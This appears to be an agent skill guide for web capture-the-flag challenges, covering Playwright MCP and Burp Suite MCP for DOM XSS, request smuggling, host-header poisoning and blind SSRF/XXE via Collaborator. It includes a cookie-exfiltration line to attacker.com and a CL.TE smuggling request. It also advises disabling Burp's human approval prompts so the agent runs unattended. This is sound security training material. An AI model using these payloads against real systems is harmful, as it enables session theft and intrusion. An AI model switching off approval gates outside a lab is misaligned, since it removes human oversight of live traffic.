# CTF Web - MCP Server Integration

Two MCP servers matter for web challenges, and they attack from opposite sides:

- **Playwright MCP** drives a real browser (Chromium/Firefox/WebKit) from the
  agent — for bugs where the *browser* is part of the vulnerability (DOM XSS,
  admin-bot simulation, SPA client secrets, multi-step authenticated flows).
- **Burp Suite MCP** exposes a running Burp to the agent — for the *wire*
  (header-level HTTP/1.1 and HTTP/2 control, request smuggling, out-of-band
  callbacks via Collaborator, mining traffic already captured in the proxy).

They pair, and the pairing needs one flag: launch Playwright MCP with
`--proxy-server http://127.0.0.1:8080 --ignore-https-errors`, browse the app in
that browser, then mine Burp's proxy history for the API surface the JavaScript
exercised. Without the proxy flag the two servers never see each other's traffic.

## Table of Contents
- [Playwright MCP (Browser Automation)](#playwright-mcp-browser-automation)
  - [Setup](#setup)
  - [Core Tools](#core-tools)
  - [Reproducing the Admin Bot (DOM XSS)](#reproducing-the-admin-bot-dom-xss)
  - [DOM, Console & Network Inspection](#dom-console--network-inspection)
  - [Authenticated Flows & File Upload](#authenticated-flows--file-upload)
  - [When to Use Playwright MCP vs curl](#when-to-use-playwright-mcp-vs-curl)
- [Burp Suite MCP (Wire-Level Exploitation)](#burp-suite-mcp-wire-level-exploitation)
  - [Setup](#setup-1)
  - [Unblock the Agent First (Approval Gates)](#unblock-the-agent-first-approval-gates)
  - [Core Tools (Full Signatures)](#core-tools-full-signatures)
  - [The Target Triple: Host Header Decoupling](#the-target-triple-host-header-decoupling)
  - [Raw Requests: HTTP/1.1 & What Survives the Wire](#raw-requests-http11--what-survives-the-wire)
  - [HTTP/2: Map-Based, and Its Limits](#http2-map-based-and-its-limits)
  - [Repeater & Intruder: Staging Only, No Results](#repeater--intruder-staging-only-no-results)
  - [Mining Proxy History](#mining-proxy-history)
  - [Collaborator: Blind SSRF / XXE / OOB](#collaborator-blind-ssrf--xxe--oob)
  - [Scanner, Encoding & Utilities](#scanner-encoding--utilities)
  - [Fast Path: Zero to Flag](#fast-path-zero-to-flag)
- [When to Use Burp MCP vs curl vs Playwright MCP](#when-to-use-burp-mcp-vs-curl-vs-playwright-mcp)

For interacting with the CTF *platform* itself (reading challenges, downloading
attachments, submitting flags) see
[../solve-challenge/SKILL.md](../solve-challenge/SKILL.md#ctf-platform-interaction-via-playwright-mcp).

---

## Playwright MCP (Browser Automation)

Many web challenges require a *real browser*: DOM XSS that only fires after JS
runs, admin-bot simulation, client-side crypto, SPA state, or multi-step flows
behind a login. **Playwright MCP** drives a real Chromium/Firefox/WebKit browser
from the agent using structured accessibility snapshots (no screenshots/vision
needed), so the agent can navigate, click, type, inspect the DOM, read the
console, and watch network traffic.

### Setup

Repository: `https://github.com/microsoft/playwright-mcp` (Apache-2.0, official
Microsoft, tested v0.0.78+).

```bash
# Launch the MCP server (Node.js required); most clients auto-manage this:
npx @playwright/mcp@latest
# Headed browser for admin-bot-style challenges that need a visible page:
npx @playwright/mcp@latest --headless=false
# The browser binary is a SEPARATE download — without it every tool call errors
# with 'Browser "chrome-for-testing" is not installed':
npx @playwright/mcp@latest install-browser chrome-for-testing
```

### Core Tools

- Navigation: `browser_navigate`, `browser_navigate_back`, `browser_tabs`
- Read state: `browser_snapshot` (accessibility tree — the primary "see the page"
  tool; `depth` to trim, `target` to scope, `filename` to offload),
  `browser_find` (regex/text search **over** the snapshot — far cheaper when you
  only need one element or one value), `browser_take_screenshot`,
  `browser_console_messages`, `browser_network_requests` → `browser_network_request`
- Interact: `browser_click`, `browser_type`, `browser_fill_form`, `browser_press_key`,
  `browser_select_option`, `browser_hover`, `browser_drag`, `browser_drop`,
  `browser_file_upload`, `browser_handle_dialog`, `browser_resize`
- Script: `browser_evaluate` (JS in page context; `filename` to offload big dumps),
  `browser_wait_for`, `browser_run_code_unsafe` (arbitrary Playwright code against
  the `page` object — `page.route` interception, multi-page flows, raw
  `page.request`; RCE-equivalent, so reach for it only when the structured tools
  cannot express the step)

**Two tools, not one, for network.** `browser_network_requests` returns *only* a
numbered list of `[METHOD] url => [status]` — **no headers and no bodies**. The
tokens, session IDs and flags live in the bodies, which you must fetch per
request:

```text
browser_network_requests static=false filter="/api/"   # narrow the list first
browser_network_request index=2 part="response-body"   # ← the actual payload
# part = request-headers | request-body | response-headers | response-body
```

Verified end to end: a `fetch('/api/token')` returning
`{"status":"ok","token":"flag{...}"}` shows up in `browser_network_requests` as
nothing more than `[GET] /api/token => [200] OK`; only
`browser_network_request part="response-body"` yields the flag.

**Defaults that hide evidence:**

- `browser_network_requests` needs `static` explicitly; `static=false` omits
  images/fonts/scripts (usually what you want, but say so).
- `browser_console_messages` defaults to `all=false` — **only messages since the
  last navigation**. A flag logged during initial page load disappears after you
  navigate again. Pass `all=true` when hunting. `level` defaults to `info`
  (each level includes more severe ones).

**Artifacts land on disk, in your working directory.** Snapshots, console logs,
and any response body the server did not send as plain text are written to
`.playwright-mcp/` in the process CWD and returned to you as a *path*, not
inline content — read the file to see it. Add `.playwright-mcp/` to `.gitignore`
so a browser-driven challenge does not end up committed.

**Key insight:** `browser_snapshot` returns a structured accessibility tree with
stable element refs — prefer it over screenshots for deciding what to click/type.
When you already know what you are looking for, `browser_find` beats a full
snapshot: it returns just the matching nodes plus context, at a fraction of the
tokens.

### Reproducing the Admin Bot (DOM XSS)

Many XSS challenges have an "admin bot" that visits your URL with the flag in its
cookie. When no bot is provided (or to test locally), Playwright MCP *is* your
bot: navigate to the payload URL as a scripted victim and observe the result.

```text
browser_navigate "https://chall.example.com/?q=<img src=x onerror=...>"
browser_console_messages        # did the payload execute? read console output
browser_network_requests        # did it exfil to your listener?
```

To validate a cookie-stealing payload end to end, set a test flag cookie and
confirm exfiltration to a placeholder collector you control:

```javascript
// browser_evaluate — simulate the victim holding the flag, then verify exfil
// Real challenge cookie is HttpOnly; this only models the non-HttpOnly case.
document.cookie = "flag=flag{test}; path=/";
new Image().src = "https://attacker.com/c?" + document.cookie;
```

**Key insight:** Playwright MCP lets the agent *be* the admin bot — it runs the
page's JavaScript exactly like a victim browser, so DOM-only XSS, framework
gadgets (Angular/Vue sandbox escapes), and mutation-XSS that never appear in raw
HTML become observable. Pair with the payloads in
[client-side.md](client-side.md) and [client-side-advanced.md](client-side-advanced.md).

### DOM, Console & Network Inspection

```text
browser_navigate "https://chall.example.com/app"
browser_find text="flag"        # cheapest first pass over the rendered page
browser_snapshot depth=6        # accessibility tree: hidden inputs, roles, refs
browser_evaluate "() => window.__APP_STATE__"   # dump SPA state / client secrets
browser_evaluate "() => [...document.scripts].map(s => s.src)"  # enumerate JS bundles
browser_network_requests static=false           # discover the endpoints...
browser_network_request index=<n> part="response-body"   # ...then read the payload
browser_console_messages level="info" all=true  # source maps, debug leaks, stack traces
```

Client-side challenges frequently hide the answer in JS: a client-side HMAC
secret, a disabled button, a flag assembled in memory. `browser_evaluate` reads
live JS values that never appear in the served HTML — verified: a secret held
only in `window.__APP_STATE__` comes back in one call.

**Key insight:** the network pair surfaces the real API surface (XHR/fetch
endpoints, bearer tokens, WebSocket URLs) that a static `curl` of the HTML misses
because JavaScript issues it after load — but discovery and payload are **two
separate calls**. Listing the requests tells you an endpoint exists; only
`browser_network_request part="response-body"` tells you what it returned. Stopping
at the list is the most common way to walk past the flag.

### Authenticated Flows & File Upload

```text
browser_navigate "https://chall.example.com/login"
browser_fill_form               # username/password fields (refs from snapshot)
browser_click <login button ref>
browser_wait_for "Dashboard"    # wait for post-login state
# session cookies now persist in the browser context for subsequent requests
browser_file_upload "/tmp/shell.png"   # drive an upload-to-RCE flow in-browser
```

**Key insight:** Playwright keeps the browser context (cookies, localStorage)
across tool calls, so multi-step authenticated challenges — log in, navigate to a
protected feature, trigger the bug — work without manually re-sending session
headers. This is the browser-side complement to the header/cookie forging in
[auth-and-access.md](auth-and-access.md).

### When to Use Playwright MCP vs curl

| Situation | Use |
|-----------|-----|
| Bug needs JavaScript to execute (DOM XSS, SPA, client crypto) | Playwright MCP |
| Simulating the admin bot / a victim browser | Playwright MCP |
| Reading JS-issued API calls, live DOM, or client secrets | Playwright MCP |
| Multi-step authenticated UI flow | Playwright MCP |
| Raw request smuggling, header injection, byte-level payloads | Burp MCP (below) / `curl` |
| Capturing all traffic for later regex mining | Playwright MCP **through** Burp (`--proxy-server`) |
| Fast fuzzing / brute force | `ffuf` / `requests` — faster, no browser overhead |

**Key insight:** Reach for Playwright MCP when the *browser* is part of the
vulnerability (client-side execution, victim simulation). For server-side bugs
where you need control over exact bytes on the wire, the Burp MCP section below
(or `curl`/`requests`) is the right tool — the browser normalizes and re-encodes
requests in ways that defeat smuggling and injection payloads.

---

## Burp Suite MCP (Wire-Level Exploitation)

Some web challenges are won on the wire: byte-exact requests, HTTP/2 smuggling,
out-of-band (OOB) callbacks for blind SSRF/XXE, or replaying a request a thousand
times with one mutated byte. **Burp Suite's official MCP Server**
([PortSwigger/mcp-server](https://github.com/PortSwigger/mcp-server)) exposes a
running Burp Suite (Community or Pro) to the agent: send raw HTTP/1.1 and HTTP/2
requests through Burp's engine, drive Repeater and Intruder, mine proxy history
captured while a browser drove the app, and get OOB interaction data from Burp
Collaborator — all without leaving the agent loop.

Burp MCP is the *wire-level* complement to Playwright's *browser-level*
automation above. The two pair well: browse the app in the Playwright browser
proxied through Burp, then mine `get_proxy_http_history` for the API surface the
JS exercised.

### Setup

Repository: `https://github.com/PortSwigger/mcp-server` (official PortSwigger,
distributed as a Burp extension jar; also on the BApp Store as "MCP Server").

Burp Pro/Community must be running with the extension loaded — the MCP server
lives *inside* Burp, so **nothing works until Burp is up**. If the agent started
while Burp was down, the client marks the server failed and the `mcp__burp__*`
tools never appear; launch Burp *first*, then start (or restart) the agent.

```bash
# 1. Build the extension jar (needs JDK 17+; the proxy jar ships in libs/):
git clone https://github.com/PortSwigger/mcp-server.git
cd mcp-server && ./gradlew embedProxyJar    # -> build/libs/burp-mcp-all.jar

# 2. Launch Burp Suite, then load the jar:
#    Extensions -> Installed -> Add -> Type: Java -> select burp-mcp-all.jar
#    An "MCP" tab appears; confirm the server is Enabled (default 127.0.0.1:9876).
#    Tick 'Automatically reload extensions on startup' so it survives restarts.

# 3. Register with the agent. The SSE endpoint is the BASE URL (root path),
#    NOT /sse — GET /sse returns 404 on current builds:
claude mcp add --transport sse burp http://127.0.0.1:9876
```

Clients that only speak stdio can use the bundled proxy instead of SSE:

```bash
java -jar /path/to/mcp-proxy-all.jar --sse-url http://127.0.0.1:9876
```

Verify without an agent — the handshake is plain SSE + JSON-RPC:

```bash
curl -s -i http://127.0.0.1:9876/sse | head -1   # HTTP/1.1 404 Not Found  <- wrong path
curl -sN http://127.0.0.1:9876/       | head -2   # event: endpoint
                                                  # data: ?sessionId=<uuid>
# then POST {"jsonrpc":"2.0","id":1,"method":"tools/list"} to /?sessionId=<uuid>
```

**Key insight:** the documented `http://127.0.0.1:9876/sse` path 404s on current
builds — the SSE stream is served from the base URL `/`. If the client reports
"failed to connect," drop the `/sse` suffix before debugging anything else.

### Unblock the Agent First (Approval Gates)

**This is the difference between a useful Burp MCP and a hung agent.** By default
`requireHttpRequestApproval` and `requireDataAccessApproval` are both **on**, so
the first `send_http1_request` or `get_proxy_http_history` pops a modal Swing
dialog *inside Burp* and the tool call blocks until a human clicks. Verified: the
call does not merely return slowly — the JSON-RPC POST itself never gets a
response, the Burp EDT is blocked, and every other UI-touching tool hangs behind
it. An unattended agent stalls on its first request.

Before starting work, in Burp's **MCP** tab:

| Setting | Default | Set for CTF | Why |
|---------|---------|-------------|-----|
| `Require approval for HTTP requests` | on | **off** (or add auto-approve targets) | otherwise every new host blocks on a dialog |
| `Require approval for project data access` | on | **off** (or tick all three `Always allow …`) | gates HTTP history, WebSocket history, Organizer |
| `Enable tools that can edit your config` | **off** | on if you want `set_user_options` | without it those tools only return a refusal string |

Keeping approvals on is fine when you are watching the screen: the dialog offers
`Allow Once` / `Always Allow Host` / `Always Allow Host:Port` / `Deny`, and the
"always" choices append to the auto-approve list. Auto-approve entries accept
`host`, `host:port`, and `*.domain` wildcards, so `*.ctf.example.com` clears a
whole competition in one entry.

With config editing off, `set_user_options` / `set_project_options` return:
`User has disabled configuration editing. They can enable it in the MCP tab…`
— verified live, and easy to misread as a bug.

**Key insight:** MCP settings live in the extension's **project** data, not user
preferences — a temporary project resets every checkbox on each launch. Open a
*saved* project file for the competition, tick the boxes once, and the agent runs
unattended for the rest of the event.

### Core Tools (Full Signatures)

27 tools, all prefixed `mcp__burp__` (verified against server `burp-suite`
v1.1.2). **Required arguments have no defaults** — omitting `count`/`offset`
fails outright with `Fields [count, offset] are required…`, and every
request-sending tool needs the full target triple:

```text
send_http1_request(content, targetHostname, targetPort, usesHttps)
send_http2_request(pseudoHeaders, headers, requestBody, targetHostname, targetPort, usesHttps)
create_repeater_tab(content, targetHostname, targetPort, usesHttps, tabName?)
create_repeater_tab_http2(pseudoHeaders, headers, requestBody, targetHostname, targetPort, usesHttps, tabName?)
send_to_intruder(content, targetHostname, targetPort, usesHttps, tabName?)

get_proxy_http_history(count, offset)
get_proxy_http_history_regex(regex, count, offset)
get_proxy_websocket_history(count, offset)
get_proxy_websocket_history_regex(regex, count, offset)
get_organizer_items(count, offset)
get_organizer_items_regex(regex, count, offset)
get_scanner_issues(count, offset)                    # Pro only

generate_collaborator_payload(customData?)           # Pro only
get_collaborator_interactions(payloadId?)            # Pro only

url_encode(content)      url_decode(content)
base64_encode(content)   base64_decode(content)
generate_random_string(length, characterSet)

output_user_options()    output_project_options()
set_user_options(json)   set_project_options(json)    # gated, see above
set_proxy_intercept_state(intercepting)
set_task_execution_engine_state(running)
get_active_editor_contents()  set_active_editor_contents(text)
```

**Community edition has no Collaborator and no scanner.** Those three tools are
registered only when the edition is `PROFESSIONAL` — on Community they are absent
from `tools/list` entirely, so a blind-SSRF plan built around Collaborator needs
an alternative listener (`interactsh`, or your own DNS/HTTP box) before you start.

Paginated tools return the literal string `Reached end of items` once `offset`
passes the last element — that sentinel, not an empty result, is the loop
terminator. Each item is JSON, and **individual items are truncated at 5000
characters** with `... (truncated)` appended. A flag buried deep in a large
response body will be cut off: narrow with the `_regex` variant, or re-issue the
request with `send_http1_request` to get the untruncated response.

### The Target Triple: Host Header Decoupling

`targetHostname` / `targetPort` / `usesHttps` decide **where the TCP connection
goes**. No URL is parsed out of `content`, so the `Host:` header inside the
request is completely independent of the socket destination. That decoupling is a
free primitive for a whole bug family — and it is *easier* here than with `curl`,
which needs `--resolve` gymnastics:

```text
# Host header injection / password-reset poisoning / cache poisoning:
targetHostname=chall.example.com  targetPort=443  usesHttps=true
content:  GET /reset HTTP/1.1
          Host: attacker.example.net

# Virtual-host brute force against an IP, hunting an internal vhost:
targetHostname=10.0.0.5  targetPort=80  usesHttps=false
content:  GET / HTTP/1.1
          Host: admin.internal
```

**Key insight:** the triple is also the trap. `usesHttps=true` with
`targetPort=80` (or the reverse) fails at the TLS layer with a confusing error,
and a stale `Host` copied from a previous request silently routes you to the wrong
vhost. When a response makes no sense, re-check the triple before the payload.

### Raw Requests: HTTP/1.1 & What Survives the Wire

`send_http1_request` is far closer to the wire than `curl` — but it is **not
byte-exact**, and knowing exactly where it rewrites you decides whether a
smuggling challenge is solvable through MCP at all.

The extension runs `normalizeHttpContent` on every request. It splits at the
first blank line and treats the two halves differently:

| Region | Treatment |
|--------|-----------|
| **Prelude** (request line + headers) | rewritten: literal `\r\n` → real CRLF, literal `\n` → CRLF, **bare LF → CRLF**, **stray CR stripped** |
| **Body** (after the first blank line) | **verbatim** — real LFs, literal `\n`, and binary bytes all pass through untouched |

That rewrite exists because MCP clients routinely emit the four characters
`\`,`r`,`\`,`n` instead of real CR+LF in JSON string arguments, which strict
servers reject with `400`. It is a usability fix that costs you byte control over
the headers:

| Smuggling / injection trick | Survives `send_http1_request`? |
|------------------------------|-------------------------------|
| Chunk-size games, terminating `0\r\n\r\n`, the smuggled request itself (all in the **body**) | **yes** — body is verbatim |
| Duplicate `Content-Length` / `Transfer-Encoding` headers | **yes** |
| Obs-fold continuation (`\r\n\tchunked`) | **yes** — tab/space survive, CRLF is re-inserted |
| Space/tab tricks (`Transfer-Encoding : chunked`, trailing space) | **yes** |
| Vertical tab / form feed / NUL inside a header value | **yes** — only CR and LF are touched |
| **Bare-LF header terminator** (`Transfer-Encoding: chunked\nX: y`) | **no** — normalized to CRLF |
| **CR-only terminator**, `\r\rX:`, lone-CR desync | **no** — CR is stripped *without* a line break, so the two headers **merge into one corrupted value** |
| Omitting the final blank line to stall a parser | **unreliable** — `normalizeHttpContent` leaves it missing (whole input treated as prelude), but Burp's request builder may append the terminator when it serializes |

```text
send_http1_request
  targetHostname=chall.example.com  targetPort=443  usesHttps=true
  content:
    POST /login HTTP/1.1
    Host: chall.example.com
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 34
    Transfer-Encoding: chunked

    0

    GET /admin HTTP/1.1
    X-Ignore: X
```

Two behaviours confirmed by capturing the raw socket on the other end, both of
which the smuggling workflow depends on:

- **`Content-Length` is never recomputed.** `Content-Length: 999` with a 5-byte
  body arrives as `Content-Length: 999` + `AAAAA`. Deliberate length/body
  mismatches — the whole basis of CL desync — pass through untouched.
- **Header order and case are preserved.** `X-Case-SeNsItIvE` arrives with its
  case intact, and duplicate `Content-Length: 5` / `Content-Length: 6` both land
  in the order given.

**Key insight:** the classic CL.TE / TE.CL desyncs work fine, because the trick
lives in the **body** and lengths are never fixed up for you. What does *not* work
is any desync that depends on a bare LF or lone CR as a **header** terminator —
that whole class is normalized away, and the lone-CR case fails *silently by
merging headers* (`Transfer-Encoding: chunked\rX-Smuggled: yes` went out as
`Transfer-Encoding: chunkedX-Smuggled: yes`), so you get a 200 and no desync
rather than an error. When a header-level trick behaves as if it vanished, it did:
drop to a raw socket (`socket`/`openssl s_client`/`pwntools`) for those, and keep
Burp MCP for everything else.

### HTTP/2: Map-Based, and Its Limits

`send_http2_request` is **not** a raw-bytes tool. It takes two JSON objects and a
body, and builds the frame for you:

```text
send_http2_request
  targetHostname=chall.example.com  targetPort=443  usesHttps=true
  pseudoHeaders: {"method":"POST","path":"/admin","scheme":"https","authority":"chall.example.com"}
  headers:       {"content-type":"application/json"}
  requestBody:   {"id":1}
```

Pseudo-headers are auto-prefixed with `:` (pass `method` or `:method`, both work)
and emitted in the order `:scheme, :method, :path, :authority`; any extra key you
add is appended, which is what makes **pseudo-header injection** reachable. But
because both arguments are maps with lowercased keys, two things are impossible:

- **duplicate headers** — a JSON object cannot hold `content-length` twice, so
  H2 duplicate-header desyncs are out
- **uppercase header names** — keys are lowercased before framing, killing
  H2-downgrade tricks that rely on case surviving to the back end

**Key insight:** use `send_http2_request` for H2.CL/H2.TE smuggling (put the
conflicting `content-length`/`transfer-encoding` in `headers`, the smuggled
request in `requestBody`) and for CRLF-in-header-value and pseudo-header
injection — those *are* reachable and `curl` cannot express them. For duplicate
or case-sensitive H2 headers, you need a raw H2 client
(`h2spec`, `hyper-h2`, Burp's own Repeater in HTTP/2 mode with inspector edits).

### Repeater & Intruder: Staging Only, No Results

Read this before planning any brute force around Intruder: **`send_to_intruder`
and `create_repeater_tab` only *stage* a request.** They return `Executed tool`
and nothing else. There is **no MCP tool to start an Intruder attack, set payload
positions, or read attack results**, and none to read a Repeater response. A human
must click in the Burp UI for anything to happen.

```text
create_repeater_tab       # parks a request in a tab for a HUMAN to iterate on
send_to_intruder          # parks a request in Intruder for a HUMAN to configure
```

So for automated fuzzing the agent has exactly two real options:

```bash
# 1. Loop send_http1_request yourself — full response text comes back every call,
#    so grep-extract in the agent loop. Best when each probe needs wire control.
# 2. Shell out to ffuf/requests — far faster for wordlist work:
ffuf -u https://chall.example.com/FUZZ -w wordlist.txt -mc 200,302 -t 40
```

**Key insight:** the earlier assumption that "Burp's engine handles concurrency
and grep-match extraction for you" does not hold over MCP — that is true of
Intruder *the GUI*, not of the MCP surface. Treat `send_to_intruder` as a handoff
to the human operator (useful when you want them to take over a promising
request), and drive automated fuzzing with `ffuf` or a `send_http1_request` loop.

### Mining Proxy History

Everything that passes through Burp's **proxy** is queryable — and that word is
load-bearing. Requests you send with `send_http1_request` go through Burp's HTTP
engine, *not* the proxy listener, so **they never appear in proxy history** —
verified: seven `send_http1_request` calls left the history returning
`Reached end of items`, while one `curl -x http://127.0.0.1:8080` showed up
immediately. The
history is only as rich as the traffic a browser or client actually pushed through
port 8080 first. Get traffic in before you mine it:

```bash
# Playwright MCP through Burp's proxy — this is the pairing that makes both useful:
npx @playwright/mcp@latest --proxy-server http://127.0.0.1:8080 --ignore-https-errors
# Anything else: point it at the proxy the usual way
curl -x http://127.0.0.1:8080 -k https://chall.example.com/
export HTTP_PROXY=http://127.0.0.1:8080 HTTPS_PROXY=http://127.0.0.1:8080
```

`--ignore-https-errors` matters: without Burp's CA installed, every HTTPS
navigation fails on a cert error and history stays empty.

Then mine it — remembering `count` and `offset` are **required**:

```text
get_proxy_http_history         count=50 offset=0     # walk the whole history
get_proxy_http_history_regex   count=20 offset=0 regex="Authorization: Bearer [\w.-]+"
get_proxy_http_history_regex   count=20 offset=0 regex="/api/v[0-9]+/[a-z]+"
get_proxy_http_history_regex   count=20 offset=0 regex="flag\{|secret|api[_-]?key"
get_proxy_websocket_history_regex count=50 offset=0 regex="flag|secret|token"
```

Each item comes back as `{"request":"…","response":"…","notes":"…"}` with full raw
headers and bodies in the two strings. The regex is a **Java `Pattern`** matched
against that whole serialized item, so one pattern sweeps headers, bodies, and
URLs at once — verified: `(?i)flag\{` against captured traffic returns the item
whose *response body* held the flag.
Java regex means `\w`, `(?i)`, and lookahead all work; it does *not* mean PCRE
recursion. Page with `offset += count` until you get `Reached end of items`, and
remember each item is cut at 5000 characters.

**Key insight:** the regex variants turn Burp's history into a searchable corpus
— pull every bearer token, session cookie, hidden API path, CSRF token, or
source-map URL the app emitted, without re-issuing a single request. This is the
wire-level analogue of `browser_network_requests`, and strictly better at it: one
call greps request *and* response bodies across all traffic, where Playwright needs
one `browser_network_request` call per endpoint and sees only what that page
issued. Use `(?i)flag\{` as the very first call on any captured session — the
cheapest flag check available.

### Collaborator: Blind SSRF / XXE / OOB

Blind and out-of-band bugs (SSRF with no reflected response, blind XXE, blind
SQLi exfil over DNS/HTTP, deserialization callbacks) need a listener you control.
Burp Collaborator is that listener, and the agent can drive it end to end:

**Pro only** — these two tools are not registered on Community at all.

```text
generate_collaborator_payload
# -> Payload: <31-char-subdomain>.oastify.com     (unique per call)
#    Payload ID: <31-char-subdomain>
#    Collaborator server: oastify.com

# inject the payload into the target (SSRF url=, XXE SYSTEM, DNS exfil, etc.)
send_http1_request ... http://<31-char-subdomain>.oastify.com/x ...

get_collaborator_interactions                    # all interactions
get_collaborator_interactions payloadId="<31-char-subdomain>"
# -> "No interactions detected"  or JSON per hit (type, timestamp, client IP, protocol data)
```

Two arguments the tool list barely hints at, both worth using:

- **`payloadId`** filters interactions to one payload. Generate a *separate*
  payload per injection point, then poll each ID — the hit tells you **which**
  parameter is vulnerable without a second round of testing. Without the filter
  you get every interaction and have to correlate by hand.
- **`customData`** bakes a label into the payload subdomain, so the callback
  itself identifies the injection point. **Hard limit: ≤16 alphanumeric
  characters** — verified, `"sqli-param-id"` is rejected for the hyphens with
  `Length of custom data must not exceed 16 alphanumeric characters`. Use short
  alnum tags like `xxe1`, `hdr2`, `ssrfurl`.

Collaborator catches **DNS, HTTP and SMTP**. The DNS channel is the important one:
it fires even when all egress HTTP is blocked, and a Java/PHP target that merely
*resolves* your hostname has already proven the SSRF. `No interactions detected`
is normal for the first few seconds — poll again before declaring a payload dead.

**Key insight:** `get_collaborator_interactions` closes the loop on bugs with no
in-band signal — if the DNS lookup or HTTP callback lands, the vulnerability is
confirmed and the subdomain/path/body of the interaction often carries exfil'd
data (hostnames, file contents, query results one character at a time). One
payload per injection point plus `payloadId` polling turns "something is
vulnerable" into "*this parameter* is vulnerable" in a single pass. Pair with the
SSRF and XXE notes in [server-side.md](server-side.md) and
[server-side-2.md](server-side-2.md). On Community, substitute `interactsh-client`
or your own DNS/HTTP listener.

### Scanner, Encoding & Utilities

```text
get_scanner_issues count=20 offset=0     # Pro: READ issues that already exist
url_encode / url_decode                  # Burp's own encoders, no shelling out
base64_encode / base64_decode            # unwrap tokens, cookies, JWT segments
generate_random_string                   # cache-buster / unique marker values
```

`get_scanner_issues` is **read-only, and there is no MCP tool to start a scan.**
On a fresh project it returns `Reached end of items`. In practice what shows up is
Burp's *passive* findings on traffic that already crossed the proxy, so it is only
useful after you have browsed the app through port 8080 — and an active scan still
needs a human to right-click → Scan.

`generate_random_string(length, characterSet)` — **`characterSet` is a literal
alphabet, not an enum name.** Verified: `characterSet="HEX"` returns
`XHHEHXXXEEXEHHHXXHEX` (drawn from the letters H, E, X), not hex digits. Pass the
actual characters: `"0123456789abcdef"` → `f47a80c30a807ee9cdd6`.

`set_proxy_intercept_state(intercepting=false)` is worth calling **defensively at
the start of a session**: if intercept was left on, every proxied request stalls in
the Intercept tab and both Playwright and the app appear to hang.
`set_task_execution_engine_state(running=false)` pauses Burp's background tasks —
useful to stop crawl/scan traffic from touching a fragile or rate-limited challenge
while you work by hand.

**Key insight:** the encode/decode helpers keep JWT, cookie, and payload
transforms inside the agent loop, but do not oversell the scanner — over MCP it is
a passive-findings reader, not an "point it at the target" button. Real triage
comes from proxy-history regex mining plus targeted `send_http1_request` probes.

### Fast Path: Zero to Flag

Order the calls so each one either yields the flag or narrows the surface:

```text
1. set_proxy_intercept_state intercepting=false        # clear a stale intercept
2. Browse the app through Burp (Playwright MCP with --proxy-server, or curl -x)
3. get_proxy_http_history_regex regex="(?i)flag\{"     # free win check
4. get_proxy_http_history_regex regex="(?i)set-cookie|authorization|api[_-]?key|csrf"
5. get_proxy_http_history_regex regex="/api/|\.js(\?|$)|graphql"   # map the surface
6. send_http1_request on the interesting endpoints — payloads, auth bypass, IDOR
7. Blind/no-reflection bug? generate_collaborator_payload per injection point,
   inject, then get_collaborator_interactions payloadId=<id>
8. Need volume? ffuf or a send_http1_request loop — NOT send_to_intruder
```

**Key insight:** steps 3–5 are three cheap calls that read *traffic you already
have* and frequently hand you the flag, a session cookie, or the one undocumented
endpoint the challenge hinges on — do them before writing a single payload. The
expensive, creative work (step 6 onward) should only ever run against a surface
history has already mapped.

---

## When to Use Burp MCP vs curl vs Playwright MCP

| Situation | Use |
|-----------|-----|
| CL.TE/TE.CL smuggling, obs-fold/duplicate headers, chunk games | Burp MCP (`send_http1_request`) |
| Host header injection / vhost brute (socket ≠ `Host:`) | Burp MCP (target triple) |
| H2.CL/H2.TE smuggling, pseudo-header or CRLF-in-value injection | Burp MCP (`send_http2_request`) |
| Blind/OOB bug needing a callback listener (SSRF, XXE, DNS exfil) | Burp MCP Collaborator (**Pro only**) |
| Mining tokens/endpoints from traffic already captured | Burp MCP (proxy history regex) |
| **Bare-LF / lone-CR header desync** | raw socket / `pwntools` — normalized away by MCP |
| **Duplicate or uppercase HTTP/2 headers** | raw H2 client — maps can't express it |
| Bug needs JavaScript to execute (DOM XSS, SPA, client crypto) | Playwright MCP |
| Simulating the admin bot / a victim browser | Playwright MCP |
| Wordlist fuzzing, brute force, high request volume | `ffuf` / `requests` — **not** `send_to_intruder` |
| Quick one-off request, scripting, tight CI loops | `curl` / `requests` |

**Key insight:** Burp MCP owns the *wire* (header-level control, OOB callbacks,
captured traffic), Playwright MCP owns the *browser* (JS execution, victim
simulation), and `curl`/`requests`/`ffuf` stay best for fast one-offs, scripted
loops, and volume. Know the two hard edges: Burp MCP normalizes CR/LF in the
request **prelude**, and it cannot *run* Intruder or start a scan — for those,
drop to raw sockets and `ffuf` respectively. Most multi-stage web challenges use
both servers: browse through Burp with `--proxy-server`, mine history for the API
surface, then attack those endpoints byte-by-byte.
